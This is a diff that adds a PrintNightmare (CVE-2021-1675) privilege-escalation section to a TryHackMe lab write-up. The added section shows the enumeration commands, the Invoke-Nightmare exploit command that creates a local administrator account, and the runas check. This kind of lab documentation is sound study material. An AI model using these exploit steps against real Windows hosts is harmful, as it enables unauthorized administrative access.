@@ -1,4 +1,4 @@
-# THM WriteUP
+# THM Write UPs
 ## [ Offensive Pentesting path](https://github.com/zinzloun/THM_WriteUP/tree/main/PT_Path_notes)
 ## [RedTeam Capstone Challange](https://github.com/zinzloun/THM_WriteUP/tree/main/RTM_Capstone)
 
@@ -1679,13 +1679,39 @@ At this point I tried with PrivescCheck, that works quite well. The command belo
 
     PS C:\Users\watamet\Music> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML"
 
-Nothin really important emerged. At this point I was stuck! 
+Nothin really important emerged. THe only useful information is that the last installed KB goes back to 2020:
+
+    KB4587735 Security Update NT AUTHORITY\SYSTEM 11/11/2020 12:00:00 AM
+    KB4586793 Security Update NT AUTHORITY\SYSTEM 11/11/2020 12:00:00 AM
+    ...
+
+Then I proceed to investigate which vulnerabilities we could exploit to escalate our privilege. Actually I did not found too much, so I had a look to other writeup and it's reported that the server is vulnerable to the so-called PrinterNightmare (CVE-2021-1675). Since I didn't know too much about this vulnerability, since I have never had the occasion to use it, I took a break to go [deeper on the matter](https://itm4n.github.io/printnightmare-exploitation/)
+First we need to check if the printer remote spool is activated:
     
+    impacket-rpcdump @10.200.95.35 | grep -A 10 MS-RPRN
+    Protocol: [MS-RPRN]: Print System Remote Protocol 
+    Provider: spoolsv.exe 
+    UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0 
+    Bindings: 
+              ncalrpc:[LRPC-ac66309ff34dbf0966]
+              ncacn_ip_tcp:10.200.95.35[49668]
+     ...
+As we have alredy seen, since powershell is not blocked by AMSI, I found that a [script](https://github.com/calebstewart/CVE-2021-1675) that can be used to try to exploit the vulnerabilty through powershell. Since we have an RDP session active we can just copy & paste the code to the server. Then I used the exploit to add a new user to the local admin group:
 
+    PS C:\Users\watamet\Music> Import-Module .\cve-2021-1675.ps1
+    PS C:\Users\watamet\Music> Invoke-Nightmare -NewUser "support.it" -NewPassword "Pwd1234"
+    [+] created payload at C:\Users\watamet\AppData\Local\Temp\2\nightmare.dll
+    [+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
+    [+] added user support.it as local administrator
+    [+] deleting payload from C:\Users\watamet\AppData\Local\Temp\2\nightmare.dll
 
+Verify if we can get a cmd as administrator:
 
+    PS C:\Users\watamet\Music> runas /user:support.it cmd.exe
+    Enter the password for support.it:
+    Attempting to start cmd.exe as user "PC-FILESRV01\support.it" ...
 
-
+A new administrator cmd window should appear.
 
     
 
